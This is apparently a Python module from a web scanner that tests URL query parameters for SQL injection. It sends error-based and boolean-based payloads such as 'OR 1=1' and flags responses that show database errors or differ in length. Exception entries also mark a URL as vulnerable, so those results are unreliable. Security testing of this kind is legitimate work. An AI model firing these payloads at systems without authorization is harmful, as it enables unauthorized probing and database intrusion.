import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re

SQL_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"mysqli_sql",
    r"supplied argument is not a valid",
    r"pg_fetch",
    r"psql: error",
    r"syntax error at or near",
    r"unterminated quoted string",
    r"unclosed quotation mark after the character string",
    r"ORA-\d{4}",
    r"SQLite\/JDBCDriver",
    r"SQL syntax.*MySQL",
    r"sqlstate",
    r"quoted string not properly terminated",
    r"SQLITE_ERROR",
    r"Fatal error: Call to"
]

# Boolean payload pairs (true, false)
BOOL_PAIRS = [
    ("' OR '1'='1' -- ", "' OR '1'='2' -- "),
    ('" OR "1"="1" -- ', '" OR "1"="2" -- '),
    ("' OR 1=1 -- ", "' OR 1=2 -- "),
    ("') OR ('1'='1' -- ", "') OR ('1'='2' -- "),
    ("' OR 'a'='a", "' OR 'a'='b")
]

HEADERS = {"User-Agent": "CerberusScanner/1.0"}


def _inject_param(url, param, new_value):
    parsed = urlparse(url)# 1. Parse URL : http://test.com/login?user=admin&pass=123 → into components.
    qs = dict(parse_qsl(parsed.query, keep_blank_values=True)) #2. Convert query into dictionary : {"user": "admin", "pass": "123"}
    qs[param] = new_value # 3. Replace selected parameter : user = "' OR '1'='1"
    new_qs = urlencode(qs, doseq=True) # 4. Rebuild query : user=' OR '1'='1&pass=123
    new_parsed = parsed._replace(query=new_qs)
    return urlunparse(new_parsed)# 5. Return new full URL

def _search_sql_error(text):
    txt = text.lower()
    for pat in SQL_ERRORS:
        if re.search(pat, txt, re.IGNORECASE):
            return re.search(pat, txt, re.IGNORECASE).group(0)
    return None

def check_error_based(url, param, baseline_text):
    findings = []
    payloads = [
        "'",
        "\"",
        "' OR '1'='1' -- ",
        "') OR ('1'='1' -- ",
        "' OR 1=1--",
        "\" OR 1=1--",
    ]
    for p in payloads:
        target = _inject_param(url, param, p)
        try:
            r = requests.get(target, headers=HEADERS, timeout=8, allow_redirects=True)
            err = _search_sql_error(r.text)
            if err:
                findings.append({
                    "param": param,
                    "payload": p,
                    "type": "error-based",
                    "evidence": err,
                    "status_code": r.status_code,
                    "url": target
                })
                # break on first error evidence (but we keep list)
        except Exception as e:
            findings.append({"param": param, "payload": p, "type": "error-based", "error": str(e)})
    return findings

def check_boolean_based(url, param, baseline_text):
    findings = []
    for true_p, false_p in BOOL_PAIRS:
        turl = _inject_param(url, param, true_p)
        furl = _inject_param(url, param, false_p)
        try:
            rt = requests.get(turl, headers=HEADERS, timeout=8, allow_redirects=True)
            rf = requests.get(furl, headers=HEADERS, timeout=8, allow_redirects=True)
            # compare len and status and a simple diff heuristic
            if rt.status_code == rf.status_code and abs(len(rt.text) - len(rf.text)) > max(5, len(baseline_text)*0.03):
                findings.append({
                    "param": param,
                    "payload_true": true_p,
                    "payload_false": false_p,
                    "type": "boolean-based",
                    "evidence": {
                        "len_true": len(rt.text),
                        "len_false": len(rf.text),
                        "status_true": rt.status_code,
                        "status_false": rf.status_code
                    },
                    "url_true": turl,
                    "url_false": furl
                })
            else:
                # Another boolean check: presence/absence of certain phrase
                # if baseline contains a phrase and true contains it and false doesn't
                # find a short substring from baseline to compare
                sample = baseline_text[:80]
                if sample and sample in rt.text and sample not in rf.text:
                    findings.append({
                        "param": param,
                        "payload_true": true_p,
                        "payload_false": false_p,
                        "type": "boolean-based",
                        "evidence": "content-difference-sample",
                        "url_true": turl,
                        "url_false": furl
                    })
        except Exception as e:
            findings.append({"param": param, "type": "boolean-based", "error": str(e)})
    return findings

def check_sqli(target_url: str) -> dict:
    """
    Main function to call. Accepts a full URL (with query string).
    Returns structured results:
    {
        "sqli": True/False,
        "details": [ {param, type, payload, evidence, ...}, ... ]
    }
    """
    parsed = urlparse(target_url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    results = {"sqli": False, "details": []}

    # If no params, nothing to test (optionally you could test body/POST)
    if not params:
        return results

    # Baseline response
    try:
        baseline = requests.get(target_url, headers=HEADERS, timeout=8, allow_redirects=True)
        baseline_text = baseline.text
    except Exception as e:
        baseline_text = ""
        results["error"] = f"Failed to fetch baseline: {e}"
        return results

    for param in params.keys():
        # Error-based tests (captures DB error message when present)
        err_findings = check_error_based(target_url, param, baseline_text)
        if err_findings:
            results["sqli"] = True
            results["details"].extend(err_findings)

        # Boolean-based tests
        bool_findings = check_boolean_based(target_url, param, baseline_text)
        if bool_findings:
            results["sqli"] = True
            results["details"].extend(bool_findings)

    return results
